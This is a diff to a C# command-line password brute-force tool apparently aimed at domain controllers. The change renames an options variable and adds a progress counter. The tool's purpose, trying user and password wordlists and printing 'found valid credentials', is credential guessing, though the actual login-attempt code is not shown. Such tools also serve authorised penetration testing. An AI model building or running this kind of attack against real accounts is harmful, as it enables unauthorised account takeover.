@@ -13,23 +13,24 @@ namespace BruteForceTool
     {
         private static void Main(string[] args)
         {
-            var options = new Options();
-            var isCommanLineValid = Parser.Default.ParseArgumentsStrict(args, options);
+            var agrsOptions = new Options();
+            var isCommanLineValid = Parser.Default.ParseArgumentsStrict(args, agrsOptions);
             if (!isCommanLineValid)
             {
                 Console.WriteLine("Command line arguments are invalid");
                 return;
             }
-            var authType = GetAuthType(options.AuthTypeInput);
-            var destinationDc = options.DestinationDc;
+            var authType = GetAuthType(agrsOptions.AuthTypeInput);
+            var attemptsCounter = 0;
+            var destinationDc = agrsOptions.DestinationDc;
             var domain = destinationDc.Substring(destinationDc.IndexOf('.') + 1);
             if (authType == AuthType.Basic)
                 domain = domain.Split('.').First();
             try
             {
-                var usersDictionary = File.ReadAllText(options.UsersListPath)
+                var usersDictionary = File.ReadAllText(agrsOptions.UsersListPath)
                     .Split(new[] {"\r\n"}, StringSplitOptions.None).Select(_ => _.Trim());
-                var passwordDictionary = File.ReadAllText(options.PasswordListPath)
+                var passwordDictionary = File.ReadAllText(agrsOptions.PasswordListPath)
                     .Split(new[] {"\r\n"}, StringSplitOptions.None);
                 Parallel.ForEach(usersDictionary, (user) =>
                 {
@@ -40,6 +41,9 @@ namespace BruteForceTool
                             Console.WriteLine($"Found valid credentials for: {user}, Password: {pass}");
                         }
                     });
+                    attemptsCounter++;
+                    if(attemptsCounter % 5 == 0)
+                        Console.WriteLine($"Attempted {attemptsCounter} accounts...");
                 });
             }
             catch (Exception)
